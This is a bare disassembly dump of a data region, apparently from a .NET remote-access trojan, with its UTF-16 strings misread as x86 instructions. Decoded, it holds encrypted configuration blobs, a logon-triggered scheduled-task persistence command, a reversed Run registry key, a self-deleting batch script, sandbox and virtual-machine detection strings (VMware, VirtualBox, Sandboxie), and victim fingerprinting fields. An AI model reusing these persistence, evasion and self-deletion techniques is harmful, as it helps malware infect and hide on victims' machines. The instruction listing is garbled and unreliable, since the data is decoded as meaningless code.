  40bed6:	4b                   	dec    %ebx
  40bed7:	00 36                	add    %dh,(%esi)
  40bed9:	00 67 00             	add    %ah,0x0(%edi)
  40bedc:	37                   	aaa
  40bedd:	00 76 00             	add    %dh,0x0(%esi)
  40bee0:	77 00                	ja     0x40bee2
  40bee2:	41                   	inc    %ecx
  40bee3:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40bee9:	80 b1 44 00 46 00 38 	xorb   $0x38,0x460044(%ecx)
  40bef0:	00 30                	add    %dh,(%eax)
  40bef2:	00 75 00             	add    %dh,0x0(%ebp)
  40bef5:	77 00                	ja     0x40bef7
  40bef7:	47                   	inc    %edi
  40bef8:	00 54 00 65          	add    %dl,0x65(%eax,%eax,1)
  40befc:	00 2f                	add    %ch,(%edi)
  40befe:	00 46 00             	add    %al,0x0(%esi)
  40bf01:	43                   	inc    %ebx
  40bf02:	00 6f 00             	add    %ch,0x0(%edi)
  40bf05:	2b 00                	sub    (%eax),%eax
  40bf07:	73 00                	jae    0x40bf09
  40bf09:	63 00                	arpl   %eax,(%eax)
  40bf0b:	49                   	dec    %ecx
  40bf0c:	00 49 00             	add    %cl,0x0(%ecx)
  40bf0f:	4b                   	dec    %ebx
  40bf10:	00 42 00             	add    %al,0x0(%edx)
  40bf13:	2b 00                	sub    (%eax),%eax
  40bf15:	6c                   	insb   (%dx),%es:(%edi)
  40bf16:	00 4d 00             	add    %cl,0x0(%ebp)
  40bf19:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40bf1d:	4a                   	dec    %edx
  40bf1e:	00 63 00             	add    %ah,0x0(%ebx)
  40bf21:	77 00                	ja     0x40bf23
  40bf23:	61                   	popa
  40bf24:	00 64 00 57          	add    %ah,0x57(%eax,%eax,1)
  40bf28:	00 54 00 53          	add    %dl,0x53(%eax,%eax,1)
  40bf2c:	00 79 00             	add    %bh,0x0(%ecx)
  40bf2f:	4e                   	dec    %esi
  40bf30:	00 30                	add    %dh,(%eax)
  40bf32:	00 70 00             	add    %dh,0x0(%eax)
  40bf35:	47                   	inc    %edi
  40bf36:	00 50 00             	add    %dl,0x0(%eax)
  40bf39:	52                   	push   %edx
  40bf3a:	00 70 00             	add    %dh,0x0(%eax)
  40bf3d:	78 00                	js     0x40bf3f
  40bf3f:	70 00                	jo     0x40bf41
  40bf41:	4d                   	dec    %ebp
  40bf42:	00 50 00             	add    %dl,0x0(%eax)
  40bf45:	6c                   	insb   (%dx),%es:(%edi)
  40bf46:	00 35 00 56 00 73    	add    %dh,0x73005600
  40bf4c:	00 65 00             	add    %ah,0x0(%ebp)
  40bf4f:	2f                   	das
  40bf50:	00 4b 00             	add    %cl,0x0(%ebx)
  40bf53:	61                   	popa
  40bf54:	00 77 00             	add    %dh,0x0(%edi)
  40bf57:	73 00                	jae    0x40bf59
  40bf59:	50                   	push   %eax
  40bf5a:	00 72 00             	add    %dh,0x0(%edx)
  40bf5d:	36 00 72 00          	add    %dh,%ss:0x0(%edx)
  40bf61:	65 00 44 00 49       	add    %al,%gs:0x49(%eax,%eax,1)
  40bf66:	00 62 00             	add    %ah,0x0(%edx)
  40bf69:	78 00                	js     0x40bf6b
  40bf6b:	78 00                	js     0x40bf6d
  40bf6d:	47                   	inc    %edi
  40bf6e:	00 4e 00             	add    %cl,0x0(%esi)
  40bf71:	51                   	push   %ecx
  40bf72:	00 50 00             	add    %dl,0x0(%eax)
  40bf75:	41                   	inc    %ecx
  40bf76:	00 5a 00             	add    %bl,0x0(%edx)
  40bf79:	70 00                	jo     0x40bf7b
  40bf7b:	39 00                	cmp    %eax,(%eax)
  40bf7d:	38 00                	cmp    %al,(%eax)
  40bf7f:	67 00 57 00          	add    %dl,0x0(%bx)
  40bf83:	7a 00                	jp     0x40bf85
  40bf85:	44                   	inc    %esp
  40bf86:	00 32                	add    %dh,(%edx)
  40bf88:	00 41 00             	add    %al,0x0(%ecx)
  40bf8b:	4e                   	dec    %esi
  40bf8c:	00 57 00             	add    %dl,0x0(%edi)
  40bf8f:	30 00                	xor    %al,(%eax)
  40bf91:	55                   	push   %ebp
  40bf92:	00 4f 00             	add    %cl,0x0(%edi)
  40bf95:	67 00 3d             	add    %bh,(%di)
  40bf98:	00 3d 00 00 80 b1    	add    %bh,0xb1800000
  40bf9e:	49                   	dec    %ecx
  40bf9f:	00 48 00             	add    %cl,0x0(%eax)
  40bfa2:	52                   	push   %edx
  40bfa3:	00 6c 00 35          	add    %ch,0x35(%eax,%eax,1)
  40bfa7:	00 38                	add    %bh,(%eax)
  40bfa9:	00 56 00             	add    %dl,0x0(%esi)
  40bfac:	41                   	inc    %ecx
  40bfad:	00 39                	add    %bh,(%ecx)
  40bfaf:	00 59 00             	add    %bl,0x0(%ecx)
  40bfb2:	73 00                	jae    0x40bfb4
  40bfb4:	36 00 7a 00          	add    %bh,%ss:0x0(%edx)
  40bfb8:	6e                   	outsb  %ds:(%esi),(%dx)
  40bfb9:	00 6c 00 76          	add    %ch,0x76(%eax,%eax,1)
  40bfbd:	00 45 00             	add    %al,0x0(%ebp)
  40bfc0:	6d                   	insl   (%dx),%es:(%edi)
  40bfc1:	00 52 00             	add    %dl,0x0(%edx)
  40bfc4:	64 00 57 00          	add    %dl,%fs:0x0(%edi)
  40bfc8:	70 00                	jo     0x40bfca
  40bfca:	75 00                	jne    0x40bfcc
  40bfcc:	43                   	inc    %ebx
  40bfcd:	00 47 00             	add    %al,0x0(%edi)
  40bfd0:	65 00 55 00          	add    %dl,%gs:0x0(%ebp)
  40bfd4:	73 00                	jae    0x40bfd6
  40bfd6:	2b 00                	sub    (%eax),%eax
  40bfd8:	72 00                	jb     0x40bfda
  40bfda:	4f                   	dec    %edi
  40bfdb:	00 70 00             	add    %dh,0x0(%eax)
  40bfde:	46                   	inc    %esi
  40bfdf:	00 4c 00 65          	add    %cl,0x65(%eax,%eax,1)
  40bfe3:	00 6b 00             	add    %ch,0x0(%ebx)
  40bfe6:	41                   	inc    %ecx
  40bfe7:	00 70 00             	add    %dh,0x0(%eax)
  40bfea:	78 00                	js     0x40bfec
  40bfec:	6b 00 56             	imul   $0x56,(%eax),%eax
  40bfef:	00 49 00             	add    %cl,0x0(%ecx)
  40bff2:	39 00                	cmp    %eax,(%eax)
  40bff4:	45                   	inc    %ebp
  40bff5:	00 78 00             	add    %bh,0x0(%eax)
  40bff8:	34 00                	xor    $0x0,%al
  40bffa:	7a 00                	jp     0x40bffc
  40bffc:	77 00                	ja     0x40bffe
  40bffe:	4d                   	dec    %ebp
  40bfff:	00 6a 00             	add    %ch,0x0(%edx)
  40c002:	56                   	push   %esi
  40c003:	00 62 00             	add    %ah,0x0(%edx)
  40c006:	68 00 65 00 64       	push   $0x64006500
  40c00b:	00 59 00             	add    %bl,0x0(%ecx)
  40c00e:	45                   	inc    %ebp
  40c00f:	00 32                	add    %dh,(%edx)
  40c011:	00 30                	add    %dh,(%eax)
  40c013:	00 71 00             	add    %dh,0x0(%ecx)
  40c016:	6d                   	insl   (%dx),%es:(%edi)
  40c017:	00 36                	add    %dh,(%esi)
  40c019:	00 6a 00             	add    %ch,0x0(%edx)
  40c01c:	52                   	push   %edx
  40c01d:	00 5a 00             	add    %bl,0x0(%edx)
  40c020:	75 00                	jne    0x40c022
  40c022:	43                   	inc    %ebx
  40c023:	00 61 00             	add    %ah,0x0(%ecx)
  40c026:	68 00 36 00 70       	push   $0x70003600
  40c02b:	00 5a 00             	add    %bl,0x0(%edx)
  40c02e:	6c                   	insb   (%dx),%es:(%edi)
  40c02f:	00 38                	add    %bh,(%eax)
  40c031:	00 57 00             	add    %dl,0x0(%edi)
  40c034:	2b 00                	sub    (%eax),%eax
  40c036:	61                   	popa
  40c037:	00 56 00             	add    %dl,0x0(%esi)
  40c03a:	79 00                	jns    0x40c03c
  40c03c:	63 00                	arpl   %eax,(%eax)
  40c03e:	6b 00 66             	imul   $0x66,(%eax),%eax
  40c041:	00 37                	add    %dh,(%edi)
  40c043:	00 36                	add    %dh,(%esi)
  40c045:	00 2f                	add    %ch,(%edi)
  40c047:	00 67 00             	add    %ah,0x0(%edi)
  40c04a:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40c04f:	03 33                	add    (%ebx),%esi
  40c051:	00 00                	add    %al,(%eax)
  40c053:	80 d9 59             	sbb    $0x59,%cl
  40c056:	00 41 00             	add    %al,0x0(%ecx)
  40c059:	2b 00                	sub    (%eax),%eax
  40c05b:	6b 00 6b             	imul   $0x6b,(%eax),%eax
  40c05e:	00 71 00             	add    %dh,0x0(%ecx)
  40c061:	57                   	push   %edi
  40c062:	00 6f 00             	add    %ch,0x0(%edi)
  40c065:	2f                   	das
  40c066:	00 4e 00             	add    %cl,0x0(%esi)
  40c069:	43                   	inc    %ebx
  40c06a:	00 61 00             	add    %ah,0x0(%ecx)
  40c06d:	32 00                	xor    (%eax),%al
  40c06f:	61                   	popa
  40c070:	00 35 00 52 00 45    	add    %dh,0x45005200
  40c076:	00 66 00             	add    %ah,0x0(%esi)
  40c079:	50                   	push   %eax
  40c07a:	00 36                	add    %dh,(%esi)
  40c07c:	00 54 00 33          	add    %dl,0x33(%eax,%eax,1)
  40c080:	00 51 00             	add    %dl,0x0(%ecx)
  40c083:	63 00                	arpl   %eax,(%eax)
  40c085:	35 00 31 00 59       	xor    $0x59003100,%eax
  40c08a:	00 54 00 4f          	add    %dl,0x4f(%eax,%eax,1)
  40c08e:	00 66 00             	add    %ah,0x0(%esi)
  40c091:	39 00                	cmp    %eax,(%eax)
  40c093:	42                   	inc    %edx
  40c094:	00 67 00             	add    %ah,0x0(%edi)
  40c097:	4a                   	dec    %edx
  40c098:	00 55 00             	add    %dl,0x0(%ebp)
  40c09b:	66 00 51 00          	data16 add %dl,0x0(%ecx)
  40c09f:	6a 00                	push   $0x0
  40c0a1:	58                   	pop    %eax
  40c0a2:	00 63 00             	add    %ah,0x0(%ebx)
  40c0a5:	6f                   	outsl  %ds:(%esi),(%dx)
  40c0a6:	00 38                	add    %bh,(%eax)
  40c0a8:	00 37                	add    %dh,(%edi)
  40c0aa:	00 71 00             	add    %dh,0x0(%ecx)
  40c0ad:	4a                   	dec    %edx
  40c0ae:	00 41 00             	add    %al,0x0(%ecx)
  40c0b1:	41                   	inc    %ecx
  40c0b2:	00 78 00             	add    %bh,0x0(%eax)
  40c0b5:	61                   	popa
  40c0b6:	00 73 00             	add    %dh,0x0(%ebx)
  40c0b9:	53                   	push   %ebx
  40c0ba:	00 52 00             	add    %dl,0x0(%edx)
  40c0bd:	47                   	inc    %edi
  40c0be:	00 72 00             	add    %dh,0x0(%edx)
  40c0c1:	4b                   	dec    %ebx
  40c0c2:	00 49 00             	add    %cl,0x0(%ecx)
  40c0c5:	32 00                	xor    (%eax),%al
  40c0c7:	33 00                	xor    (%eax),%eax
  40c0c9:	63 00                	arpl   %eax,(%eax)
  40c0cb:	4b                   	dec    %ebx
  40c0cc:	00 35 00 67 00 44    	add    %dh,0x44006700
  40c0d2:	00 43 00             	add    %al,0x0(%ebx)
  40c0d5:	66 00 79 00          	data16 add %bh,0x0(%ecx)
  40c0d9:	76 00                	jbe    0x40c0db
  40c0db:	69 00 4c 00 2f 00    	imul   $0x2f004c,(%eax),%eax
  40c0e1:	30 00                	xor    %al,(%eax)
  40c0e3:	64 00 2b             	add    %ch,%fs:(%ebx)
  40c0e6:	00 44 00 4e          	add    %al,0x4e(%eax,%eax,1)
  40c0ea:	00 43 00             	add    %al,0x0(%ebx)
  40c0ed:	46                   	inc    %esi
  40c0ee:	00 6b 00             	add    %ch,0x0(%ebx)
  40c0f1:	36 00 37             	add    %dh,%ss:(%edi)
  40c0f4:	00 32                	add    %dh,(%edx)
  40c0f6:	00 38                	add    %bh,(%eax)
  40c0f8:	00 57 00             	add    %dl,0x0(%edi)
  40c0fb:	53                   	push   %ebx
  40c0fc:	00 70 00             	add    %dh,0x0(%eax)
  40c0ff:	4b                   	dec    %ebx
  40c100:	00 2b                	add    %ch,(%ebx)
  40c102:	00 74 00 4e          	add    %dh,0x4e(%eax,%eax,1)
  40c106:	00 32                	add    %dh,(%edx)
  40c108:	00 67 00             	add    %ah,0x0(%edi)
  40c10b:	48                   	dec    %eax
  40c10c:	00 53 00             	add    %dl,0x0(%ebx)
  40c10f:	6f                   	outsl  %ds:(%esi),(%dx)
  40c110:	00 44 00 38          	add    %al,0x38(%eax,%eax,1)
  40c114:	00 75 00             	add    %dh,0x0(%ebp)
  40c117:	39 00                	cmp    %eax,(%eax)
  40c119:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40c11d:	6e                   	outsb  %ds:(%esi),(%dx)
  40c11e:	00 59 00             	add    %bl,0x0(%ecx)
  40c121:	44                   	inc    %esp
  40c122:	00 67 00             	add    %ah,0x0(%edi)
  40c125:	76 00                	jbe    0x40c127
  40c127:	52                   	push   %edx
  40c128:	00 6f 00             	add    %ch,0x0(%edi)
  40c12b:	3d 00 00 09 6e       	cmp    $0x6e090000,%eax
  40c130:	00 75 00             	add    %dh,0x0(%ebp)
  40c133:	6c                   	insb   (%dx),%es:(%edi)
  40c134:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40c138:	01 00                	add    %eax,(%eax)
  40c13a:	03 3a                	add    (%edx),%edi
  40c13c:	00 00                	add    %al,(%eax)
  40c13e:	0d 50 00 61 00       	or     $0x610050,%eax
  40c143:	63 00                	arpl   %eax,(%eax)
  40c145:	6b 00 65             	imul   $0x65,(%eax),%eax
  40c148:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40c14c:	09 50 00             	or     %edx,0x0(%eax)
  40c14f:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40c155:	00 0f                	add    %cl,(%edi)
  40c157:	4d                   	dec    %ebp
  40c158:	00 65 00             	add    %ah,0x0(%ebp)
  40c15b:	73 00                	jae    0x40c15d
  40c15d:	73 00                	jae    0x40c15f
  40c15f:	61                   	popa
  40c160:	00 67 00             	add    %ah,0x0(%edi)
  40c163:	65 00 00             	add    %al,%gs:(%eax)
  40c166:	07                   	pop    %es
  40c167:	63 00                	arpl   %eax,(%eax)
  40c169:	6d                   	insl   (%dx),%es:(%edi)
  40c16a:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  40c16e:	69 2f 00 63 00 20    	imul   $0x20006300,(%edi),%ebp
  40c174:	00 73 00             	add    %dh,0x0(%ebx)
  40c177:	63 00                	arpl   %eax,(%eax)
  40c179:	68 00 74 00 61       	push   $0x61007400
  40c17e:	00 73 00             	add    %dh,0x0(%ebx)
  40c181:	6b 00 73             	imul   $0x73,(%eax),%eax
  40c184:	00 20                	add    %ah,(%eax)
  40c186:	00 2f                	add    %ch,(%edi)
  40c188:	00 63 00             	add    %ah,0x0(%ebx)
  40c18b:	72 00                	jb     0x40c18d
  40c18d:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40c191:	74 00                	je     0x40c193
  40c193:	65 00 20             	add    %ah,%gs:(%eax)
  40c196:	00 2f                	add    %ch,(%edi)
  40c198:	00 66 00             	add    %ah,0x0(%esi)
  40c19b:	20 00                	and    %al,(%eax)
  40c19d:	2f                   	das
  40c19e:	00 73 00             	add    %dh,0x0(%ebx)
  40c1a1:	63 00                	arpl   %eax,(%eax)
  40c1a3:	20 00                	and    %al,(%eax)
  40c1a5:	6f                   	outsl  %ds:(%esi),(%dx)
  40c1a6:	00 6e 00             	add    %ch,0x0(%esi)
  40c1a9:	6c                   	insb   (%dx),%es:(%edi)
  40c1aa:	00 6f 00             	add    %ch,0x0(%edi)
  40c1ad:	67 00 6f 00          	add    %ch,0x0(%bx)
  40c1b1:	6e                   	outsb  %ds:(%esi),(%dx)
  40c1b2:	00 20                	add    %ah,(%eax)
  40c1b4:	00 2f                	add    %ch,(%edi)
  40c1b6:	00 72 00             	add    %dh,0x0(%edx)
  40c1b9:	6c                   	insb   (%dx),%es:(%edi)
  40c1ba:	00 20                	add    %ah,(%eax)
  40c1bc:	00 68 00             	add    %ch,0x0(%eax)
  40c1bf:	69 00 67 00 68 00    	imul   $0x680067,(%eax),%eax
  40c1c5:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40c1c9:	74 00                	je     0x40c1cb
  40c1cb:	20 00                	and    %al,(%eax)
  40c1cd:	2f                   	das
  40c1ce:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40c1d2:	00 20                	add    %ah,(%eax)
  40c1d4:	00 22                	add    %ah,(%edx)
  40c1d6:	00 00                	add    %al,(%eax)
  40c1d8:	11 22                	adc    %esp,(%edx)
  40c1da:	00 20                	add    %ah,(%eax)
  40c1dc:	00 2f                	add    %ch,(%edi)
  40c1de:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40c1e2:	00 20                	add    %ah,(%eax)
  40c1e4:	00 27                	add    %ah,(%edi)
  40c1e6:	00 22                	add    %ah,(%edx)
  40c1e8:	00 01                	add    %al,(%ecx)
  40c1ea:	13 22                	adc    (%edx),%esp
  40c1ec:	00 27                	add    %ah,(%edi)
  40c1ee:	00 20                	add    %ah,(%eax)
  40c1f0:	00 26                	add    %ah,(%esi)
  40c1f2:	00 20                	add    %ah,(%eax)
  40c1f4:	00 65 00             	add    %ah,0x0(%ebp)
  40c1f7:	78 00                	js     0x40c1f9
  40c1f9:	69 00 74 00 01 5d    	imul   $0x5d010074,(%eax),%eax
  40c1ff:	5c                   	pop    %esp
  40c200:	00 6e 00             	add    %ch,0x0(%esi)
  40c203:	75 00                	jne    0x40c205
  40c205:	52                   	push   %edx
  40c206:	00 5c 00 6e          	add    %bl,0x6e(%eax,%eax,1)
  40c20a:	00 6f 00             	add    %ch,0x0(%edi)
  40c20d:	69 00 73 00 72 00    	imul   $0x720073,(%eax),%eax
  40c213:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  40c217:	74 00                	je     0x40c219
  40c219:	6e                   	outsb  %ds:(%esi),(%dx)
  40c21a:	00 65 00             	add    %ah,0x0(%ebp)
  40c21d:	72 00                	jb     0x40c21f
  40c21f:	72 00                	jb     0x40c221
  40c221:	75 00                	jne    0x40c223
  40c223:	43                   	inc    %ebx
  40c224:	00 5c 00 73          	add    %bl,0x73(%eax,%eax,1)
  40c228:	00 77 00             	add    %dh,0x0(%edi)
  40c22b:	6f                   	outsl  %ds:(%esi),(%dx)
  40c22c:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  40c230:	00 69 00             	add    %ch,0x0(%ecx)
  40c233:	57                   	push   %edi
  40c234:	00 5c 00 74          	add    %bl,0x74(%eax,%eax,1)
  40c238:	00 66 00             	add    %ah,0x0(%esi)
  40c23b:	6f                   	outsl  %ds:(%esi),(%dx)
  40c23c:	00 73 00             	add    %dh,0x0(%ebx)
  40c23f:	6f                   	outsl  %ds:(%esi),(%dx)
  40c240:	00 72 00             	add    %dh,0x0(%edx)
  40c243:	63 00                	arpl   %eax,(%eax)
  40c245:	69 00 4d 00 5c 00    	imul   $0x5c004d,(%eax),%eax
  40c24b:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c24f:	61                   	popa
  40c250:	00 77 00             	add    %dh,0x0(%edi)
  40c253:	74 00                	je     0x40c255
  40c255:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40c259:	53                   	push   %ebx
  40c25a:	00 00                	add    %al,(%eax)
  40c25c:	03 22                	add    (%edx),%esp
  40c25e:	00 00                	add    %al,(%eax)
  40c260:	09 2e                	or     %ebp,(%esi)
  40c262:	00 62 00             	add    %ah,0x0(%edx)
  40c265:	61                   	popa
  40c266:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40c26a:	13 40 00             	adc    0x0(%eax),%eax
  40c26d:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c271:	68 00 6f 00 20       	push   $0x20006f00
  40c276:	00 6f 00             	add    %ch,0x0(%edi)
  40c279:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40c27d:	00 1f                	add    %bl,(%edi)
  40c27f:	74 00                	je     0x40c281
  40c281:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  40c287:	6f                   	outsl  %ds:(%esi),(%dx)
  40c288:	00 75 00             	add    %dh,0x0(%ebp)
  40c28b:	74 00                	je     0x40c28d
  40c28d:	20 00                	and    %al,(%eax)
  40c28f:	33 00                	xor    (%eax),%eax
  40c291:	20 00                	and    %al,(%eax)
  40c293:	3e 00 20             	add    %ah,%ds:(%eax)
  40c296:	00 4e 00             	add    %cl,0x0(%esi)
  40c299:	55                   	push   %ebp
  40c29a:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40c29e:	15 53 00 54 00       	adc    $0x540053,%eax
  40c2a3:	41                   	inc    %ecx
  40c2a4:	00 52 00             	add    %dl,0x0(%edx)
  40c2a7:	54                   	push   %esp
  40c2a8:	00 20                	add    %ah,(%eax)
  40c2aa:	00 22                	add    %ah,(%edx)
  40c2ac:	00 22                	add    %ah,(%edx)
  40c2ae:	00 20                	add    %ah,(%eax)
  40c2b0:	00 22                	add    %ah,(%edx)
  40c2b2:	00 00                	add    %al,(%eax)
  40c2b4:	07                   	pop    %es
  40c2b5:	43                   	inc    %ebx
  40c2b6:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  40c2ba:	00 00                	add    %al,(%eax)
  40c2bc:	0b 44 00 45          	or     0x45(%eax,%eax,1),%eax
  40c2c0:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  40c2c4:	00 22                	add    %ah,(%edx)
  40c2c6:	00 00                	add    %al,(%eax)
  40c2c8:	0f 22 00             	mov    %eax,%cr0
  40c2cb:	20 00                	and    %al,(%eax)
  40c2cd:	2f                   	das
  40c2ce:	00 66 00             	add    %ah,0x0(%esi)
  40c2d1:	20 00                	and    %al,(%eax)
  40c2d3:	2f                   	das
  40c2d4:	00 71 00             	add    %dh,0x0(%ecx)
  40c2d7:	00 05 78 00 70 00    	add    %al,0x700078
  40c2dd:	00 45 53             	add    %al,0x53(%ebp)
  40c2e0:	00 65 00             	add    %ah,0x0(%ebp)
  40c2e3:	6c                   	insb   (%dx),%es:(%edi)
  40c2e4:	00 65 00             	add    %ah,0x0(%ebp)
  40c2e7:	63 00                	arpl   %eax,(%eax)
  40c2e9:	74 00                	je     0x40c2eb
  40c2eb:	20 00                	and    %al,(%eax)
  40c2ed:	2a 00                	sub    (%eax),%al
  40c2ef:	20 00                	and    %al,(%eax)
  40c2f1:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40c2f5:	6f                   	outsl  %ds:(%esi),(%dx)
  40c2f6:	00 6d 00             	add    %ch,0x0(%ebp)
  40c2f9:	20 00                	and    %al,(%eax)
  40c2fb:	57                   	push   %edi
  40c2fc:	00 69 00             	add    %ch,0x0(%ecx)
  40c2ff:	6e                   	outsb  %ds:(%esi),(%dx)
  40c300:	00 33                	add    %dh,(%ebx)
  40c302:	00 32                	add    %dh,(%edx)
  40c304:	00 5f 00             	add    %bl,0x0(%edi)
  40c307:	43                   	inc    %ebx
  40c308:	00 6f 00             	add    %ch,0x0(%edi)
  40c30b:	6d                   	insl   (%dx),%es:(%edi)
  40c30c:	00 70 00             	add    %dh,0x0(%eax)
  40c30f:	75 00                	jne    0x40c311
  40c311:	74 00                	je     0x40c313
  40c313:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c317:	53                   	push   %ebx
  40c318:	00 79 00             	add    %bh,0x0(%ecx)
  40c31b:	73 00                	jae    0x40c31d
  40c31d:	74 00                	je     0x40c31f
  40c31f:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40c323:	00 19                	add    %bl,(%ecx)
  40c325:	4d                   	dec    %ebp
  40c326:	00 61 00             	add    %ah,0x0(%ecx)
  40c329:	6e                   	outsb  %ds:(%esi),(%dx)
  40c32a:	00 75 00             	add    %dh,0x0(%ebp)
  40c32d:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40c331:	63 00                	arpl   %eax,(%eax)
  40c333:	74 00                	je     0x40c335
  40c335:	75 00                	jne    0x40c337
  40c337:	72 00                	jb     0x40c339
  40c339:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c33d:	00 2b                	add    %ch,(%ebx)
  40c33f:	6d                   	insl   (%dx),%es:(%edi)
  40c340:	00 69 00             	add    %ch,0x0(%ecx)
  40c343:	63 00                	arpl   %eax,(%eax)
  40c345:	72 00                	jb     0x40c347
  40c347:	6f                   	outsl  %ds:(%esi),(%dx)
  40c348:	00 73 00             	add    %dh,0x0(%ebx)
  40c34b:	6f                   	outsl  %ds:(%esi),(%dx)
  40c34c:	00 66 00             	add    %ah,0x0(%esi)
  40c34f:	74 00                	je     0x40c351
  40c351:	20 00                	and    %al,(%eax)
  40c353:	63 00                	arpl   %eax,(%eax)
  40c355:	6f                   	outsl  %ds:(%esi),(%dx)
  40c356:	00 72 00             	add    %dh,0x0(%edx)
  40c359:	70 00                	jo     0x40c35b
  40c35b:	6f                   	outsl  %ds:(%esi),(%dx)
  40c35c:	00 72 00             	add    %dh,0x0(%edx)
  40c35f:	61                   	popa
  40c360:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40c364:	00 6f 00             	add    %ch,0x0(%edi)
  40c367:	6e                   	outsb  %ds:(%esi),(%dx)
  40c368:	00 00                	add    %al,(%eax)
  40c36a:	0b 4d 00             	or     0x0(%ebp),%ecx
  40c36d:	6f                   	outsl  %ds:(%esi),(%dx)
  40c36e:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40c372:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40c376:	0f 56 00             	orps   (%eax),%xmm0
  40c379:	49                   	dec    %ecx
  40c37a:	00 52 00             	add    %dl,0x0(%edx)
  40c37d:	54                   	push   %esp
  40c37e:	00 55 00             	add    %dl,0x0(%ebp)
  40c381:	41                   	inc    %ecx
  40c382:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40c386:	0d 76 00 6d 00       	or     $0x6d0076,%eax
  40c38b:	77 00                	ja     0x40c38d
  40c38d:	61                   	popa
  40c38e:	00 72 00             	add    %dh,0x0(%edx)
  40c391:	65 00 00             	add    %al,%gs:(%eax)
  40c394:	15 56 00 69 00       	adc    $0x690056,%eax
  40c399:	72 00                	jb     0x40c39b
  40c39b:	74 00                	je     0x40c39d
  40c39d:	75 00                	jne    0x40c39f
  40c39f:	61                   	popa
  40c3a0:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40c3a4:	00 6f 00             	add    %ch,0x0(%edi)
  40c3a7:	78 00                	js     0x40c3a9
  40c3a9:	00 17                	add    %dl,(%edi)
  40c3ab:	53                   	push   %ebx
  40c3ac:	00 62 00             	add    %ah,0x0(%edx)
  40c3af:	69 00 65 00 44 00    	imul   $0x440065,(%eax),%eax
  40c3b5:	6c                   	insb   (%dx),%es:(%edi)
  40c3b6:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40c3ba:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40c3be:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40c3c2:	11 45 00             	adc    %eax,0x0(%ebp)
  40c3c5:	72 00                	jb     0x40c3c7
  40c3c7:	72 00                	jb     0x40c3c9
  40c3c9:	20 00                	and    %al,(%eax)
  40c3cb:	48                   	dec    %eax
  40c3cc:	00 57 00             	add    %dl,0x0(%edi)
  40c3cf:	49                   	dec    %ecx
  40c3d0:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40c3d4:	05 78 00 32 00       	add    $0x320078,%eax
  40c3d9:	00 15 43 00 6c 00    	add    %dl,0x6c0043
  40c3df:	69 00 65 00 6e 00    	imul   $0x6e0065,(%eax),%eax
  40c3e5:	74 00                	je     0x40c3e7
  40c3e7:	49                   	dec    %ecx
  40c3e8:	00 6e 00             	add    %ch,0x0(%esi)
  40c3eb:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40c3ef:	00 09                	add    %cl,(%ecx)
  40c3f1:	48                   	dec    %eax
  40c3f2:	00 57 00             	add    %dl,0x0(%edi)
  40c3f5:	49                   	dec    %ecx
  40c3f6:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40c3fa:	09 55 00             	or     %edx,0x0(%ebp)
  40c3fd:	73 00                	jae    0x40c3ff
  40c3ff:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c403:	00 05 4f 00 53 00    	add    %al,0x53004f
  40c409:	00 13                	add    %dl,(%ebx)
  40c40b:	4d                   	dec    %ebp
  40c40c:	00 69 00             	add    %ch,0x0(%ecx)
  40c40f:	63 00                	arpl   %eax,(%eax)
  40c411:	72 00                	jb     0x40c413
  40c413:	6f                   	outsl  %ds:(%esi),(%dx)
  40c414:	00 73 00             	add    %dh,0x0(%ebx)
  40c417:	6f                   	outsl  %ds:(%esi),(%dx)
  40c418:	00 66 00             	add    %ah,0x0(%esi)
  40c41b:	74 00                	je     0x40c41d
  40c41d:	00 03                	add    %al,(%ebx)
  40c41f:	20 00                	and    %al,(%eax)
  40c421:	00 09                	add    %cl,(%ecx)
  40c423:	54                   	push   %esp
  40c424:	00 72 00             	add    %dh,0x0(%edx)
  40c427:	75 00                	jne    0x40c429
  40c429:	65 00 00             	add    %al,%gs:(%eax)
  40c42c:	0b 36                	or     (%esi),%esi
  40c42e:	00 34 00             	add    %dh,(%eax,%eax,1)
  40c431:	62 00                	bound  %eax,(%eax)
  40c433:	69 00 74 00 00 0b    	imul   $0xb000074,(%eax),%eax
  40c439:	46                   	inc    %esi
  40c43a:	00 61 00             	add    %ah,0x0(%ecx)
  40c43d:	6c                   	insb   (%dx),%es:(%edi)
  40c43e:	00 73 00             	add    %dh,0x0(%ebx)
